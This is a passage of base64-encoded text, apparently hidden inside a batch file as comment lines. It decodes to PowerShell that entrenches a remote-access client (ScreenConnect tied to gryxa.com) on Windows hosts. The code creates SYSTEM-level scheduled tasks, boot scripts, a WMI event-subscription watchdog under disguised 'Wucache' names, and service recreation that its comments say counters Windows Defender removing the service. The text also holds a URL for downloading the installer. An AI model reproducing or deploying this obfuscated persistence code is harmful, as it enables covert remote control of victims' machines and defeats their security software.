::Y2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICAgICAgQ29weS1J
::dGVtIC1MaXRlcmFsUGF0aCAkTW9uUGF0aCAtRGVzdGluYXRpb24gJGV0bE1vbiAt
::Rm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICB9DQogICAg
::IyBMMzc6IGRlZGljYXRlZCBib290IGdyeXhhLWhlYWwuIERlZmVuZGVyIGNhbiBz
::dHJpcCB0aGUgZ3J5eGEgU0NNIHNlcnZpY2UgZW50cnkgZHVyaW5nDQogICAgIyBi
::b290IGJlZm9yZSB0aGUgbW9uJ3MgTUlOVVRFIHRhc2sgZmlyZXMuIEEgYm9vdC10
::cmlnZ2VyIGVuc3VyZSAoLU5vV2FpdCAtRm9yY2UpIHJlLWNyZWF0ZXMNCiAgICAj
::IGl0IHdpdGhpbiBzZWNvbmRzIG9mIHN0YXJ0dXAsIHNvIHJlYm9vdHMgbm8gbG9u
::Z2VyIGRyb3AgdGhlIGhvc3QgZnJvbSBncnl4YS4NCiAgICAkYm9vdEdyeXhhID0g
::Sm9pbi1QYXRoICRib290ICdncnl4YV9ib290LmNtZCcNCiAgICAkbGliSW5Cb290
::ID0gSm9pbi1QYXRoICRib290ICdvd25fbGliLnBzMScNCiAgICBpZiAoVGVzdC1Q
::YXRoIC1MaXRlcmFsUGF0aCAoSm9pbi1QYXRoICRXb3JrRGlyICdvd25fbGliLnBz
::MScpKSB7DQogICAgICAgIENvcHktSXRlbSAtTGl0ZXJhbFBhdGggKEpvaW4tUGF0
::aCAkV29ya0RpciAnb3duX2xpYi5wczEnKSAtRGVzdGluYXRpb24gJGxpYkluQm9v
::dCAtRm9yY2UgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUNCiAgICB9DQog
::ICAgJGdiTGluZXMgPSBAKA0KICAgICAgICAnQGVjaG8gb2ZmJywNCiAgICAgICAg
::J3JlbSBMNDYgRlJFRVpFIGJvb3Qgc2Mgc3RhcnQgb25seScsDQogICAgICAgICdz
::YyBzdGFydCAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKDM2ZTUwNmZmMDE2YjIxNTEp
::IiA+bnVsIDI+JjEnLA0KICAgICAgICAnZXhpdCcNCiAgICApDQogICAgU2V0LUNv
::bnRlbnQgLUxpdGVyYWxQYXRoICRib290R3J5eGEgLVZhbHVlICRnYkxpbmVzIC1F
::bmNvZGluZyBBU0NJSSAtRm9yY2UNCiAgICAjIEJPT1QgaXMgbm90IExvY2tEaXIn
::ZCBieSBvd25fc2VjdXJlIOKAlCBUYXNrIFNjaGVkdWxlciBjYW4gcmVzb2x2ZSBU
::UiB0aGVyZS4NCiAgICAkdHJNb24gPSAiY21kLmV4ZSAvYyAkYm9vdE1vbiINCiAg
::ICAkdHJFdGwgPSAiY21kLmV4ZSAvYyAkYm9vdEV0bCINCiAgICAkdHJHcnl4YSA9
::ICJjbWQuZXhlIC9jICRib290R3J5eGEiDQogICAgJG1vQSA9IFtzdHJpbmddJGlk
::WydNT19BJ107IGlmICgtbm90ICRtb0EpIHsgJG1vQSA9ICcyJyB9DQogICAgJG1v
::QiA9IFtzdHJpbmddJGlkWydNT19CJ107IGlmICgtbm90ICRtb0IpIHsgJG1vQiA9
::ICczJyB9DQogICAgJHN0ID0gKEdldC1EYXRlKS5Ub1N0cmluZygnSEg6bW0nKQ0K
::ICAgICRzcGVjcyA9IEAoDQogICAgICAgIEB7IEtleSA9ICdUQVNLX0EnOyBNYXJr
::ZXIgPSAnb3duX21vbi5jbWQnOyBTYyA9ICdNSU5VVEUnOyBNbyA9ICRtb0E7IFRy
::ID0gJHRyTW9uIH0NCiAgICAgICAgQHsgS2V5ID0gJ1RBU0tfQic7IE1hcmtlciA9
::ICdldGxfbW9uLmNtZCc7IFNjID0gJ01JTlVURSc7IE1vID0gJG1vQjsgVHIgPSAk
::dHJFdGwgfQ0KICAgICAgICBAeyBLZXkgPSAnVEFTS19DJzsgTWFya2VyID0gJ293
::bl9tb24uY21kJzsgU2MgPSAnT05TVEFSVCc7IE1vID0gJyc7IFRyID0gJHRyTW9u
::IH0NCiAgICAgICAgQHsgS2V5ID0gJ1RBU0tfRCc7IE1hcmtlciA9ICdvd25fbW9u
::LmNtZCc7IFNjID0gJ09OTE9HT04nOyBNbyA9ICcnOyBUciA9ICR0ck1vbiB9DQog
::ICAgICAgIEB7IEtleSA9ICdUQVNLX0cnOyBNYXJrZXIgPSAnZ3J5eGFfYm9vdC5j
::bWQnOyBTYyA9ICdPTlNUQVJUJzsgTW8gPSAnJzsgVHIgPSAkdHJHcnl4YSB9DQog
::ICAgKQ0KICAgICRvayA9IDA7ICRyZWFybWVkID0gMDsgJGZhaWwgPSAwDQogICAg
::Zm9yZWFjaCAoJHNwIGluICRzcGVjcykgew0KICAgICAgICAjIFRBU0tfRyAoYm9v
::dCBncnl4YS1oZWFsKSB1c2VzIGEgZml4ZWQgbmFtZTsgdGhlIEEtRCByb3RhdGlv
::biBwb29sIGhhcyBubyBzbG90IGZvciBpdC4NCiAgICAgICAgJHRuID0gaWYgKCRz
::cC5LZXkgLWVxICdUQVNLX0cnKSB7ICdXdWNhY2hlR3J5eGFCb290JyB9IGVsc2Ug
::eyBOb3JtYWxpemUtVGFza05hbWUgKFtzdHJpbmddJGlkWyRzcC5LZXldKSB9DQog
::ICAgICAgIGlmICgtbm90ICR0bikgeyAkZmFpbCsrOyBjb250aW51ZSB9DQogICAg
::ICAgIGlmIChUZXN0LVRhc2tPd25zTW9uICR0biAkc3AuTWFya2VyKSB7ICRvaysr
::OyBjb250aW51ZSB9DQogICAgICAgIGlmIChUZXN0LVRhc2tPd25zTW9uICgiXCR0
::biIpICRzcC5NYXJrZXIpIHsgJG9rKys7IGNvbnRpbnVlIH0NCiAgICAgICAgJGJs
::b2IgPSBHZXQtVGFza1ZlcmJvc2VCbG9iICR0bg0KICAgICAgICBpZiAoLW5vdCAk
::YmxvYikgeyAkYmxvYiA9IEdldC1UYXNrVmVyYm9zZUJsb2IgKCJcJHRuIikgfQ0K
::ICAgICAgICBpZiAoJGJsb2IpIHsNCiAgICAgICAgICAgICRvdXJzQnJva2VuID0g
::KCRibG9iIC1tYXRjaCAnKD9pKW93bl9tb25cLmNtZHxldGxfbW9uXC5jbWR8Z3J5
::eGFfYm9vdFwuY21kfFwud3VjYWNoZVxcfFwuZXRsY2FjaGVcXCcpDQogICAgICAg
::ICAgICBpZiAoLW5vdCAkb3Vyc0Jyb2tlbikgeyAkZmFpbCsrOyBXcml0ZS1Pd25M
::b2cgInRhc2tzX3NraXBfZm9yZWlnbiAkdG4iOyBjb250aW51ZSB9DQogICAgICAg
::ICAgICBSZW1vdmUtVGFza1F1aWV0ICR0bg0KICAgICAgICAgICAgUmVtb3ZlLVRh
::c2tRdWlldCAoIlwkdG4iKQ0KICAgICAgICB9DQogICAgICAgICMgQnVpbGQgY21k
::bGluZSBleGFjdGx5IGxpa2Ugb3duLmNtZCBkZXRhY2ggKHByb3ZlbiB0byB3b3Jr
::IGFzIFNZU1RFTSkuDQogICAgICAgICRwYXJ0cyA9IEAoDQogICAgICAgICAgICAn
::L0NyZWF0ZScsICcvVE4nLCAkdG4sICcvUlUnLCAnU1lTVEVNJywgJy9STCcsICdI
::SUdIRVNUJywgJy9GJywNCiAgICAgICAgICAgICcvVFInLCAkc3AuVHIsICcvU0Mn
::LCAkc3AuU2MNCiAgICAgICAgKQ0KICAgICAgICBpZiAoJHNwLlNjIC1lcSAnTUlO
::VVRFJykgew0KICAgICAgICAgICAgJHBhcnRzICs9IEAoJy9NTycsICRzcC5Nbywg
::Jy9TVCcsICRzdCkNCiAgICAgICAgfQ0KICAgICAgICAkYXJnTGluZSA9ICgkcGFy
::dHMgfCBGb3JFYWNoLU9iamVjdCB7DQogICAgICAgICAgICBpZiAoJF8gLW1hdGNo
::ICdbXHMiXScpIHsgJyJ7MH0iJyAtZiAoJF8gLXJlcGxhY2UgJyInLCAnXCInKSB9
::IGVsc2UgeyAkXyB9DQogICAgICAgIH0pIC1qb2luICcgJw0KICAgICAgICAkY3Jl
::YXRlVHh0ID0gY21kLmV4ZSAvYyAic2NodGFza3MuZXhlICRhcmdMaW5lIiAyPiYx
::IHwgRm9yRWFjaC1PYmplY3QgeyAiJF8iIH0NCiAgICAgICAgJGNyZWF0ZUpvaW5l
::ZCA9ICgkY3JlYXRlVHh0IC1qb2luICcgJykuVHJpbSgpDQogICAgICAgIFdyaXRl
::LU93bkxvZyAidGFza3NfY3JlYXRlICQoJHNwLktleSkgJHRuID0+ICRjcmVhdGVK
::b2luZWQiDQogICAgICAgIGlmICgoVGVzdC1UYXNrT3duc01vbiAkdG4gJHNwLk1h
::cmtlcikgLW9yIChUZXN0LVRhc2tPd25zTW9uICgiXCR0biIpICRzcC5NYXJrZXIp
::KSB7DQogICAgICAgICAgICAkcmVhcm1lZCsrDQogICAgICAgICAgICBpZiAoJHNw
::LktleSAtZXEgJ1RBU0tfQScgLW9yICRzcC5LZXkgLWVxICdUQVNLX0InKSB7DQog
::ICAgICAgICAgICAgICAgY21kLmV4ZSAvYyAic2NodGFza3MuZXhlIC9SdW4gL1RO
::IGAiJHRuYCIiIHwgT3V0LU51bGwNCiAgICAgICAgICAgIH0NCiAgICAgICAgfSBl
::bHNlIHsNCiAgICAgICAgICAgICRmYWlsKysNCiAgICAgICAgICAgIFdyaXRlLU93
::bkxvZyAidGFza3NfY3JlYXRlX0ZBSUwgJCgkc3AuS2V5KSAkdG4iDQogICAgICAg
::IH0NCiAgICB9DQogICAgcmV0dXJuICJ0YXNrcyBvaz0kb2sgcmVhcm1lZD0kcmVh
::cm1lZCBmYWlsPSRmYWlsIg0KfQ0KDQpmdW5jdGlvbiBSZW1vdmUtV2F0Y2hkb2cg
::ew0KICAgIGZvcmVhY2ggKCRjbHMgaW4gQCgnX19GaWx0ZXJUb0NvbnN1bWVyQmlu
::ZGluZycsJ19fRXZlbnRGaWx0ZXInLCdDb21tYW5kTGluZUV2ZW50Q29uc3VtZXIn
::LCdfX0ludGVydmFsVGltZXJJbnN0cnVjdGlvbicpKSB7DQogICAgICAgIEdldC1X
::bWlPYmplY3QgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlvbiAtQ2xhc3MgJGNs
::cyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8DQogICAgICAgICAgICBX
::aGVyZS1PYmplY3Qgew0KICAgICAgICAgICAgICAgICgkXy5OYW1lIC1lcSAnV3Vj
::YWNoZVdhdGNoZG9nRicpIC1vciAoJF8uTmFtZSAtZXEgJ1d1Y2FjaGVXYXRjaGRv
::Z0MnKSAtb3INCiAgICAgICAgICAgICAgICAoJF8uVGltZXJJZCAtZXEgJ1d1Y2Fj
::aGVXYXRjaGRvZycpIC1vcg0KICAgICAgICAgICAgICAgICgkXy5GaWx0ZXIgLWFu
::ZCAkXy5GaWx0ZXIuVG9TdHJpbmcoKSAtbGlrZSAnKld1Y2FjaGVXYXRjaGRvZ0Yq
::JykgLW9yDQogICAgICAgICAgICAgICAgKCRfLkNvbnN1bWVyIC1hbmQgJF8uQ29u
::c3VtZXIuVG9TdHJpbmcoKSAtbGlrZSAnKld1Y2FjaGVXYXRjaGRvZ0MqJykNCiAg
::ICAgICAgICAgIH0gfCBGb3JFYWNoLU9iamVjdCB7ICRfLkRlbGV0ZSgpIHwgT3V0
::LU51bGwgfQ0KICAgIH0NCn0NCg0KZnVuY3Rpb24gSW5zdGFsbC1XYXRjaGRvZyB7
::DQogICAgaWYgKC1ub3QgJE1vblBhdGgpIHsgcmV0dXJuICRmYWxzZSB9DQogICAg
::UmVtb3ZlLVdhdGNoZG9nDQogICAgJG9rID0gJHRydWUNCiAgICB0cnkgew0KICAg
::ICAgICBTZXQtV21pSW5zdGFuY2UgLU5hbWVzcGFjZSByb290XHN1YnNjcmlwdGlv
::biAtQ2xhc3MgX19JbnRlcnZhbFRpbWVySW5zdHJ1Y3Rpb24gYA0KICAgICAgICAg
::ICAgLUFyZ3VtZW50cyBAeyBUaW1lcklkID0gJ1d1Y2FjaGVXYXRjaGRvZyc7IElu
::dGVydmFsTWlsbGlzZWNvbmRzID0gMTgwMDAwOyBTa2lwSWZQYXNzZWQgPSAkZmFs
::c2UgfSB8IE91dC1OdWxsDQogICAgICAgICRmID0gU2V0LVdtaUluc3RhbmNlIC1O
::YW1lc3BhY2Ugcm9vdFxzdWJzY3JpcHRpb24gLUNsYXNzIF9fRXZlbnRGaWx0ZXIg
::YA0KICAgICAgICAgICAgLUFyZ3VtZW50cyBAeyBOYW1lID0gJ1d1Y2FjaGVXYXRj
::aGRvZ0YnOyBFdmVudE5hbWVzcGFjZSA9ICdyb290XGNpbXYyJzsgUXVlcnlMYW5n
::dWFnZSA9ICdXUUwnOw0KICAgICAgICAgICAgICAgICAgICAgICAgICBRdWVyeSA9
::ICJTRUxFQ1QgKiBGUk9NIF9fVGltZXJFdmVudCBXSEVSRSBUaW1lcklkPSdXdWNh
::Y2hlV2F0Y2hkb2cnIiB9DQogICAgICAgICRjID0gU2V0LVdtaUluc3RhbmNlIC1O
::YW1lc3BhY2Ugcm9vdFxzdWJzY3JpcHRpb24gLUNsYXNzIENvbW1hbmRMaW5lRXZl
::bnRDb25zdW1lciBgDQogICAgICAgICAgICAtQXJndW1lbnRzIEB7IE5hbWUgPSAn
::V3VjYWNoZVdhdGNoZG9nQyc7IENvbW1hbmRMaW5lVGVtcGxhdGUgPSAiY21kLmV4
::ZSAvYyBgIiRNb25QYXRoYCIiOyBSdW5JbnRlcmFjdGl2ZWx5ID0gJGZhbHNlIH0N
::CiAgICAgICAgU2V0LVdtaUluc3RhbmNlIC1OYW1lc3BhY2Ugcm9vdFxzdWJzY3Jp
::cHRpb24gLUNsYXNzIF9fRmlsdGVyVG9Db25zdW1lckJpbmRpbmcgYA0KICAgICAg
::ICAgICAgLUFyZ3VtZW50cyBAeyBGaWx0ZXIgPSAkZjsgQ29uc3VtZXIgPSAkYyB9
::IHwgT3V0LU51bGwNCiAgICB9IGNhdGNoIHsgJG9rID0gJGZhbHNlIH0NCiAgICBy
::ZXR1cm4gJG9rDQp9DQoNCmZ1bmN0aW9uIFRlc3QtV2F0Y2hkb2dHcmFwaCB7DQog
::ICAgJHQgPSBHZXQtV21pT2JqZWN0IC1OYW1lc3BhY2Ugcm9vdFxzdWJzY3JpcHRp
::b24gLUNsYXNzIF9fSW50ZXJ2YWxUaW1lckluc3RydWN0aW9uIC1GaWx0ZXIgIlRp
::bWVySWQ9J1d1Y2FjaGVXYXRjaGRvZyciIC1FcnJvckFjdGlvbiBTaWxlbnRseUNv
::bnRpbnVlDQogICAgJGYgPSBHZXQtV21pT2JqZWN0IC1OYW1lc3BhY2Ugcm9vdFxz
::dWJzY3JpcHRpb24gLUNsYXNzIF9fRXZlbnRGaWx0ZXIgLUZpbHRlciAiTmFtZT0n
::V3VjYWNoZVdhdGNoZG9nRiciIC1FcnJvckFjdGlvbiBTaWxlbnRseUNvbnRpbnVl
::DQogICAgJGMgPSBHZXQtV21pT2JqZWN0IC1OYW1lc3BhY2Ugcm9vdFxzdWJzY3Jp
::cHRpb24gLUNsYXNzIENvbW1hbmRMaW5lRXZlbnRDb25zdW1lciAtRmlsdGVyICJO
::YW1lPSdXdWNhY2hlV2F0Y2hkb2dDJyIgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29u
::dGludWUNCiAgICAkYiA9ICRudWxsDQogICAgaWYgKCRmIC1hbmQgJGMpIHsNCiAg
::ICAgICAgJGIgPSBHZXQtV21pT2JqZWN0IC1OYW1lc3BhY2Ugcm9vdFxzdWJzY3Jp
::cHRpb24gLUNsYXNzIF9fRmlsdGVyVG9Db25zdW1lckJpbmRpbmcgLUVycm9yQWN0
::aW9uIFNpbGVudGx5Q29udGludWUgfA0KICAgICAgICAgICAgV2hlcmUtT2JqZWN0
::IHsgJF8uRmlsdGVyIC1saWtlICcqV3VjYWNoZVdhdGNoZG9nRionIC1hbmQgJF8u
::Q29uc3VtZXIgLWxpa2UgJypXdWNhY2hlV2F0Y2hkb2dDKicgfSB8DQogICAgICAg
::ICAgICBTZWxlY3QtT2JqZWN0IC1GaXJzdCAxDQogICAgfQ0KICAgIHJldHVybiBb
::Ym9vbF0oJHQgLWFuZCAkZiAtYW5kICRjIC1hbmQgJGIpDQp9DQoNCmZ1bmN0aW9u
::IEVuc3VyZS1XYXRjaGRvZyB7DQogICAgaWYgKFRlc3QtV2F0Y2hkb2dHcmFwaCkg
::eyByZXR1cm4gJ09LJyB9DQogICAgaWYgKC1ub3QgJE1vblBhdGgpIHsgcmV0dXJu
::ICdNSVNTSU5HJyB9DQogICAgaWYgKEluc3RhbGwtV2F0Y2hkb2cpIHsgcmV0dXJu
::ICdSRUFSTUVEJyB9DQogICAgcmV0dXJuICdGQUlMJw0KfQ0KDQojIENvcnJlY3Qg
::MzItYml0ICsgNjQtYml0IEFSUCBoaXZlcy4gTDYgYW5kIGVhcmxpZXIgdXNlZCBh
::IHRydW5jYXRlZA0KIyBXT1c2NDMyTm9kZSBwYXRoIChtaXNzaW5nIE1pY3Jvc29m
::dFxXaW5kb3dzKSBzbyBFVkVSWSAzMi1iaXQgU0MgcHJvZHVjdA0KIyB3YXMgaW52
::aXNpYmxlIHRvIHJlcGFpci9leHRlcm1pbmF0ZS9yZWdpc3RlcmVkLg0KJHNjcmlw
::dDpVbmluc3RhbGxSb290cyA9IEAoDQogICAgJ0hLTE06XFNPRlRXQVJFXE1pY3Jv
::c29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFVuaW5zdGFsbCcsDQogICAgJ0hL
::TE06XFNPRlRXQVJFXFdPVzY0MzJOb2RlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJl
::bnRWZXJzaW9uXFVuaW5zdGFsbCcNCikNCg0KZnVuY3Rpb24gVGVzdC1TQ1JlZ2lz
::dGVyZWQoW3N0cmluZ10kRmluZ2VycHJpbnQpIHsNCiAgICAjIEw4OiBORVZFUiB1
::c2UgcmV0dXJuIGluc2lkZSBGb3JFYWNoLU9iamVjdCAtIGl0IG9ubHkgZXhpdHMg
::dGhlDQogICAgIyBwaXBlbGluZSBpdGVyYXRpb24sIHNvIHRoaXMgZnVuY3Rpb24g
::YWx3YXlzIGZlbGwgdGhyb3VnaCB0byAnbm8nDQogICAgIyBhbmQgdGhlIG1vbiBv
::cnBoYW4tbGFkZGVyIGRlbGV0ZWQgaGVhbHRoeSByZWdpc3RlcmVkIHNlcnZpY2Vz
::Lg0KICAgIGlmICgtbm90ICRGaW5nZXJwcmludCkgeyByZXR1cm4gJ25vJyB9DQog
::ICAgJG5hbWUgPSAiU2NyZWVuQ29ubmVjdCBDbGllbnQgKCRGaW5nZXJwcmludCki
::DQogICAgZm9yZWFjaCAoJHJvb3QgaW4gJHNjcmlwdDpVbmluc3RhbGxSb290cykg
::ew0KICAgICAgICBpZiAoLW5vdCAoVGVzdC1QYXRoICRyb290KSkgeyBjb250aW51
::ZSB9DQogICAgICAgIGZvcmVhY2ggKCRrZXkgaW4gKEdldC1DaGlsZEl0ZW0gJHJv
::b3QgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpKSB7DQogICAgICAgICAg
::ICAkZG4gPSAoR2V0LUl0ZW1Qcm9wZXJ0eSAka2V5LlBTUGF0aCAtRXJyb3JBY3Rp
::b24gU2lsZW50bHlDb250aW51ZSkuRGlzcGxheU5hbWUNCiAgICAgICAgICAgIGlm
::ICgkZG4gLWFuZCAoJGRuIC1pZXEgJG5hbWUpIC1hbmQgKCRrZXkuUFNDaGlsZE5h
::bWUgLWxpa2UgJ3sqfScpKSB7IHJldHVybiAneWVzJyB9DQogICAgICAgIH0NCiAg
::ICB9DQogICAgcmV0dXJuICdubycNCn0NCg0KZnVuY3Rpb24gUmVwYWlyLVNDU2Vy
::dmljZShbc3RyaW5nXSRGaW5nZXJwcmludCkgew0KICAgICMgTDMwOiBORVZFUiBy
::dW4gbXNpZXhlYyAvZmEgb3IgL2kgb24gYSBTY3JlZW5Db25uZWN0IHByb2R1Y3Qg
::4oCUIFNDIGluc3RhbmNlcyBzaGFyZQ0KICAgICMgbGVnYWN5IFVwZ3JhZGVDb2Rl
::cywgc28gYW55IG1zaWV4ZWMgcmVwYWlyL2luc3RhbGwgb24gb25lIEZQIHRyaWdn
::ZXJzIGENCiAgICAjIG1ham9yLXVwZ3JhZGUgcmVtb3ZhbCB0aGF0IGtub2NrcyB0
::aGUgR3J5eGEgc2libGluZyBPRkZMSU5FLiBTZXJ2aWNlLWxldmVsIGhlYWwgb25s
::eS4NCiAgICBpZiAoLW5vdCAkRmluZ2VycHJpbnQpIHsgcmV0dXJuICduby1mcCcg
::fQ0KICAgICRuYW1lID0gIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgkRmluZ2VycHJp
::bnQpIg0KICAgICRzdmMgPSBHZXQtU2VydmljZSAtTmFtZSAkbmFtZSAtRXJyb3JB
::Y3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgIGlmICgkc3ZjIC1hbmQgJHN2Yy5T
::dGF0dXMgLWVxICdSdW5uaW5nJykgeyByZXR1cm4gJ3N2Yy1ydW5uaW5nJyB9DQog
::ICAgaWYgKCRzdmMpIHsNCiAgICAgICAgIyBwcmVzZW50IGJ1dCBzdG9wcGVkIC0+
::IHNlcnZpY2UtbGV2ZWwgc3RhcnQsIG5vIG1zaWV4ZWMNCiAgICAgICAgJiBzYy5l
::eGUgY29uZmlnICIkbmFtZSIgc3RhcnQ9IGF1dG8gMj4mMSB8IE91dC1OdWxsDQog
::ICAgICAgICYgc2MuZXhlIGZhaWx1cmUgIiRuYW1lIiByZXNldD0gODY0MDAgYWN0
::aW9ucz0gcmVzdGFydC81MDAwL3Jlc3RhcnQvNTAwMC9yZXN0YXJ0LzUwMDAgMj4m
::MSB8IE91dC1OdWxsDQogICAgICAgICYgc2MuZXhlIHN0YXJ0ICIkbmFtZSIgMj4m
::MSB8IE91dC1OdWxsDQogICAgICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDYNCiAg
::ICAgICAgJiBzYy5leGUgc3RhcnQgIiRuYW1lIiAyPiYxIHwgT3V0LU51bGwNCiAg
::ICAgICAgJHN2YyA9IEdldC1TZXJ2aWNlIC1OYW1lICRuYW1lIC1FcnJvckFjdGlv
::biBTaWxlbnRseUNvbnRpbnVlDQogICAgICAgIGlmICgkc3ZjIC1hbmQgJHN2Yy5T
::dGF0dXMgLWVxICdSdW5uaW5nJykgeyByZXR1cm4gJ3N2Yy1zdGFydGVkJyB9DQog
::ICAgICAgIHJldHVybiAnc3ZjLXN0aWxsLXN0b3BwZWQtbm9yZXBhaXIobXNpZXhl
::Yy1kaXNhYmxlZCknDQogICAgfQ0KICAgICMgc2VydmljZSBlbnRyeSBnb25lOiBy
::ZS1jcmVhdGUgZnJvbSB0aGUgcmVnaXN0ZXJlZCBwcm9kdWN0J3MgaW5zdGFsbCBk
::aXIgV0lUSE9VVCBtc2lleGVjLg0KICAgICMgSWYgYmluYXJpZXMgZXhpc3QsIHNj
::LmV4ZSBjcmVhdGUgKyBzdGFydC4gRWxzZSByZXBvcnQgc28gY2FsbGVyIGNhbiBk
::ZWNpZGUgKG5ldmVyIC9mYSwgbmV2ZXIgL2kpLg0KICAgICRkaXIgPSAkbnVsbA0K
::ICAgIGZvcmVhY2ggKCRiYXNlIGluIEAoJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9
::LCAkZW52OlByb2dyYW1GaWxlcykpIHsNCiAgICAgICAgJGNhbmQgPSBKb2luLVBh
::dGggJGJhc2UgIlNjcmVlbkNvbm5lY3QgQ2xpZW50ICgkRmluZ2VycHJpbnQpIg0K
::ICAgICAgICBpZiAoVGVzdC1QYXRoIC1MaXRlcmFsUGF0aCAoSm9pbi1QYXRoICRj
::YW5kICdTY3JlZW5Db25uZWN0LkNsaWVudFNlcnZpY2UuZXhlJykpIHsgJGRpciA9
::ICRjYW5kOyBicmVhayB9DQogICAgfQ0KICAgIGlmICgtbm90ICRkaXIpIHsgcmV0
::dXJuICdub3QtcmVnaXN0ZXJlZC1ub3JlcGFpcihtc2lleGVjLWRpc2FibGVkKScg
::fQ0KICAgICRleGUgPSBKb2luLVBhdGggJGRpciAnU2NyZWVuQ29ubmVjdC5DbGll
::bnRTZXJ2aWNlLmV4ZScNCiAgICAmIHNjLmV4ZSBjcmVhdGUgIiRuYW1lIiBiaW5Q
::YXRoPSAiYCIkZXhlYCIiIHN0YXJ0PSBhdXRvIERpc3BsYXlOYW1lPSAiJG5hbWUi
::IDI+JjEgfCBPdXQtTnVsbA0KICAgICYgc2MuZXhlIGZhaWx1cmUgIiRuYW1lIiBy
::ZXNldD0gODY0MDAgYWN0aW9ucz0gcmVzdGFydC81MDAwL3Jlc3RhcnQvNTAwMC9y
::ZXN0YXJ0LzUwMDAgMj4mMSB8IE91dC1OdWxsDQogICAgJiBzYy5leGUgc3RhcnQg
::IiRuYW1lIiAyPiYxIHwgT3V0LU51bGwNCiAgICBTdGFydC1TbGVlcCAtU2Vjb25k
::cyA1DQogICAgJHN2YyA9IEdldC1TZXJ2aWNlIC1OYW1lICRuYW1lIC1FcnJvckFj
::dGlvbiBTaWxlbnRseUNvbnRpbnVlDQogICAgaWYgKCRzdmMgLWFuZCAkc3ZjLlN0
::YXR1cyAtZXEgJ1J1bm5pbmcnKSB7IHJldHVybiAnc3ZjLXJlY3JlYXRlZC1zdGFy
::dGVkJyB9DQogICAgcmV0dXJuICdzdmMtcmVjcmVhdGVkLW5vdC1ydW5uaW5nJw0K
::fQ0KDQojIOKUgOKUgCBHcnl4YSBTQyB2MiAoY2xlYW4gcmV3cml0ZSkg4pSA4pSA
::4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA
::4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSA4pSADQojIFNpbmds
::ZS1mbGlnaHQgZW5zdXJlLiBSdW5uaW5nID0+IGhlYWx0aHkuIFN0b3BwZWQgc3Zj
::ID0+IHN0YXJ0Lg0KIyBCcm9rZW4vU3R1Y2sgPT4gY2xlYW4tcmVpbnN0YWxsIG9u
::Y2UsIGRldGFjaGVkLiBBYnNlbnQgPT4gaW5zdGFsbCBvbmNlLg0KIyBObyAvZmEs
::IG5vIGlubGluZSBibG9ja2luZyAvaSwgbm8gZmFsc2UgImFscmVhZHlfcnVubmlu
::ZyIuDQokc2NyaXB0OkdyeXhhRGVmYXVsdEZwID0gJzM2ZTUwNmZmMDE2YjIxNTEn
::DQokc2NyaXB0OkdyeXhhTXNpVXJsID0gJ2h0dHBzOi8vdWkuZ3J5eGEuY29tL0Jp
::bi9TY3JlZW5Db25uZWN0LkNsaWVudFNldHVwLm1zaT9lPUFjY2VzcyZ5PUd1ZXN0
::Jw0KJHNjcmlwdDpHcnl4YVJlbGF5SG9zdCA9ICd1cGRhdGUuZ3J5eGEuY29tJw0K
::JHNjcmlwdDpHcnl4YVVpSG9zdCA9ICd1aS5ncnl4YS5jb20nDQokc2NyaXB0OlNl
::dnJ6RGVmYXVsdFByaW1hcnkgPSAnNWY2MDEwNTc5ODUyZTUwNycNCiRzY3JpcHQ6
::U2V2cnpEZWZhdWx0QWx0ID0gJ2Y4NjFjODE0MGQ0NTM0MjcnDQokc2NyaXB0OlNl
::dnJ6S2VlcCA9IEAoJHNjcmlwdDpTZXZyekRlZmF1bHRQcmltYXJ5LCAkc2NyaXB0
::OlNldnJ6RGVmYXVsdEFsdCkNCiMgU2V0IHRvIGEgMTYtaGV4IEZQIHlvdSBXQU5U
::IGluc3RhbGxlZCAoYWZ0ZXIgcm90YXRpbmcgb24gdGhlIHBhbmVsKS4gQW55IGhv
::c3QNCiMgcnVubmluZyBhIGRpZmZlcmVudCBGUCBtaWdyYXRlcyB0byB0aGlzIG9u
::ZS4gTGVhdmUgJycgdG8ganVzdCB0cmFjayB3aGF0ZXZlciBydW5zLg0KJHNjcmlw
::dDpHcnl4YUV4cGVjdGVkRnAgPSAnMzZlNTA2ZmYwMTZiMjE1MScNCg0KIyBMNDA6
::IFJTQSBwdWJsaWMga2V5IGZvciB1cGRhdGUubWFuaWZlc3QgdmVyaWZpY2F0aW9u
::IChwcml2YXRlIGtleSBpbiBrZXlzLywgZ2l0aWdub3JlZCkNCiRzY3JpcHQ6VXBk
::YXRlUHViS2V5WG1sID0gQCcNCjxSU0FLZXlWYWx1ZT48TW9kdWx1cz50QUJaUG52
::c3Vwb3JpMTltdEpiSG9UMXVGR1ZMTktxT05CMHh0dklCSDRIcGZNNVUrU3RDdUdu
::RWRJeVB5a01RUGpERWxWQlpPZWE4cGRkQnh4UE1JOTRkNFZCcGR3blFlZFdIbG5s
::NkV1UXNKTDJNTWMweG8wZHV6cFFkUFZqRG5lSUl0T3hWTW5sNE1tVFNTOGkxNU9m
::TlRINnlkZGxmaTZ0TmZUdnZDdGt4bEw5YzBxWHh0SW9ZTFFMOWpDMjk0dDJPMHZP
::c0FsaWgwaFM2WEFHcDhPQVRLUi9LVlBwOHFmdzh0enJTdktnWWtwZTc5Yko2N2J0
::ak83cVRIdjFKcFAwNHhlWXRDS2pTRk42WGgwMmRydHF2eXVDSHZ3MSswSFlmdmlh
::SDV5TkFwd29OeC9mNVU2M3VNaWlyS3VKYVpNQnZYTTh1bXh5a0FHcnFkU1UwcFE9
::PTwvTW9kdWx1cz48RXhwb25lbnQ+QVFBQjwvRXhwb25lbnQ+PC9SU0FLZXlWYWx1
